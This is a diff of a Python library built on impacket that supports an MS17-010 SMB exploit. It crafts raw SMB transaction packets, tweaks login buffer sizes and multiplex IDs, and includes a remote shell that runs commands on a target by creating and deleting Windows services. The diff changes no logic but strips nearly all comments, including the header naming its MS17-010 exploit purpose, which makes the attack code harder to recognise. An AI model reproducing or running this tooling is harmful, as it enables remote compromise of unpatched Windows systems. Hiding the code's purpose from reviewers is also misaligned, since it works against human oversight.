@@ -1,5 +1,3 @@
-# impacket SMB extension for MS17-010 exploit.
-# this file contains only valid SMB packet format operation.
 from impacket import smb, smbconnection
 from impacket.dcerpc.v5 import transport, scmr
 from struct import pack
@@ -15,7 +13,6 @@ def getNTStatus(self):
 	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
 setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
 
-############# SMB_COM_TRANSACTION_SECONDARY (0x26)
 class SMBTransactionSecondary_Parameters(smb.SMBCommand_Parameters):
 	structure = (
 		('TotalParameterCount','<H=0'),
@@ -28,8 +25,7 @@ class SMBTransactionSecondary_Parameters(smb.SMBCommand_Parameters):
 		('DataDisplacement','<H=0'),
 )
 
-# Note: impacket-0.9.15 struct has no ParameterDisplacement
-############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
+
 class SMBTransaction2Secondary_Parameters(smb.SMBCommand_Parameters):
 	structure = (
 		('TotalParameterCount','<H=0'),
@@ -43,7 +39,6 @@ class SMBTransaction2Secondary_Parameters(smb.SMBCommand_Parameters):
 		('FID','<H=0'),
 )
 
-############# SMB_COM_NT_TRANSACTION_SECONDARY (0xA1)
 class SMBNTTransactionSecondary_Parameters(smb.SMBCommand_Parameters):
 	structure = (
 		('Reserved1','3s=""'),
@@ -60,14 +55,11 @@ class SMBNTTransactionSecondary_Parameters(smb.SMBCommand_Parameters):
 
 
 def _put_trans_data(transCmd, parameters, data, noPad=False):
-	# have to init offset before calling len()
+	
 	transCmd['Parameters']['ParameterOffset'] = 0
 	transCmd['Parameters']['DataOffset'] = 0
 	
-	# SMB header: 32 bytes
-	# WordCount: 1 bytes
-	# ByteCount: 2 bytes
-	# Note: Setup length is included when len(param) is called
+
 	offset = 32 + 1 + len(transCmd['Parameters']) + 2
 	
 	transData = ''
@@ -88,7 +80,7 @@ def _put_trans_data(transCmd, parameters, data, noPad=False):
 origin_NewSMBPacket_addCommand = getattr(smb.NewSMBPacket, "addCommand")
 login_MaxBufferSize = 61440
 def NewSMBPacket_addCommand_hook_login(self, command):
-	# restore NewSMBPacket.addCommand
+	
 	setattr(smb.NewSMBPacket, "addCommand", origin_NewSMBPacket_addCommand)
 	
 	if isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Extended_Parameters):
@@ -96,11 +88,9 @@ def NewSMBPacket_addCommand_hook_login(self, command):
 	elif isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Parameters):
 		command['Parameters']['MaxBuffer'] = login_MaxBufferSize
 	
-	# call original one
 	origin_NewSMBPacket_addCommand(self, command)
 
 def _setup_login_packet_hook(maxBufferSize):
-	# setup hook for next NewSMBPacket.addCommand if maxBufferSize is not None
 	if maxBufferSize is not None:
 		global login_MaxBufferSize
 		login_MaxBufferSize = maxBufferSize
@@ -116,8 +106,8 @@ class MYSMB(smb.SMB):
 		if 0x4000 <= self._last_mid <= 0x4110:
 			self._last_mid += 0x120
 		self._pkt_flags2 = 0
-		self._last_tid = 0  # last tid from connect_tree()
-		self._last_fid = 0  # last fid from nt_create_andx()
+		self._last_tid = 0
+		self._last_fid = 0
 		self._smbConn = None
 		smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)
 
@@ -173,11 +163,9 @@ class MYSMB(smb.SMB):
 		rpctransport = transport.SMBTransport(self.get_remote_host(), self.get_remote_host(), filename='\\'+named_pipe, smb_connection=smbConn)
 		return rpctransport.get_dce_rpc()
 
-	# override SMB.neg_session() to allow forcing ntlm authentication
 	def neg_session(self, extended_security=True, negPacket=None):
 		smb.SMB.neg_session(self, extended_security=self.__use_ntlmv2, negPacket=negPacket)
 
-	# to use any login method, SMB must not be used from multiple thread
 	def login(self, user, password, domain='', lmhash='', nthash='', ntlm_fallback=True, maxBufferSize=None):
 		_setup_login_packet_hook(maxBufferSize)
 		smb.SMB.login(self, user, password, domain, lmhash, nthash)
@@ -230,10 +218,10 @@ class MYSMB(smb.SMB):
 		writeAndX['Parameters'] = smb.SMBWriteAndX_Parameters_Short()
 		writeAndX['Parameters']['Fid'] = fid
 		writeAndX['Parameters']['Offset'] = 0
-		writeAndX['Parameters']['WriteMode'] = 4  # SMB_WMODE_WRITE_RAW_NAMED_PIPE
-		writeAndX['Parameters']['Remaining'] = 12345  # can be any. raw named pipe does not use it
+		writeAndX['Parameters']['WriteMode'] = 4
+		writeAndX['Parameters']['Remaining'] = 12345
 		writeAndX['Parameters']['DataLength'] = len(data)
-		writeAndX['Parameters']['DataOffset'] = 32 + len(writeAndX['Parameters']) + 1 + 2 + 1 # WordCount(1), ByteCount(2), Padding(1)
+		writeAndX['Parameters']['DataOffset'] = 32 + len(writeAndX['Parameters']) + 1 + 2 + 1
 		writeAndX['Data'] = '\x00' + data  # pad 1 byte
 		
 		self.send_raw(self.create_smb_packet(writeAndX, mid, pid, tid))
@@ -258,7 +246,7 @@ class MYSMB(smb.SMB):
 			self.signSMB(pkt, self._SigningSessionKey, self._SigningChallengeResponse)
 			
 		req = str(pkt)
-		return '\x00'*2 + pack('>H', len(req)) + req  # assume length is <65536
+		return '\x00'*2 + pack('>H', len(req)) + req
 
 	def send_raw(self, data):
 		self.get_socket().send(data)
@@ -430,7 +418,6 @@ class RemoteShell(cmd.Cmd):
 
         s = rpc.get_smbconnection()
 
-        # We don't wanna deal with timeouts from now on.
         s.setTimeout(100000)
         if mode == 'SERVER':
             myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
@@ -443,7 +430,7 @@ class RemoteShell(cmd.Cmd):
         self.do_cd('')
 
     def finish(self):
-        # Just in case the service is still created
+	
         try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect() 
@@ -468,7 +455,7 @@ class RemoteShell(cmd.Cmd):
         return False
 
     def do_cd(self, s):
-        # We just can't CD or maintain track of the target dir.
+		
         if len(s) > 0:
             logging.error("You can't CD under SMBEXEC. Use full paths.")
 
@@ -516,7 +503,6 @@ class RemoteShell(cmd.Cmd):
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output()
-        #print(self.__outputBuffer)
 
     def send_data(self, data):
         self.execute_remote(data)
@@ -537,7 +523,7 @@ class SMBServer(Thread):
         os.rmdir(SMBSERVER_DIR)
 
     def run(self):
-        # Here we write a mini config for the server
+	
         smbConfig = ConfigParser.ConfigParser()
         smbConfig.add_section('global')
         smbConfig.set('global','server_name','server_name')
@@ -546,14 +532,12 @@ class SMBServer(Thread):
         smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
         smbConfig.set('global','credentials_file','')
 
-        # Let's add a dummy share
         smbConfig.add_section(DUMMY_SHARE)
         smbConfig.set(DUMMY_SHARE,'comment','')
         smbConfig.set(DUMMY_SHARE,'read only','no')
         smbConfig.set(DUMMY_SHARE,'share type','0')
         smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)
 
-        # IPC always needed
         smbConfig.add_section('IPC$')
         smbConfig.set('IPC$','comment','')
         smbConfig.set('IPC$','read only','yes')
@@ -580,4 +564,3 @@ class SMBServer(Thread):
         self.smb.socket.close()
         self.smb.server_close()
         self._Thread__stop()
-
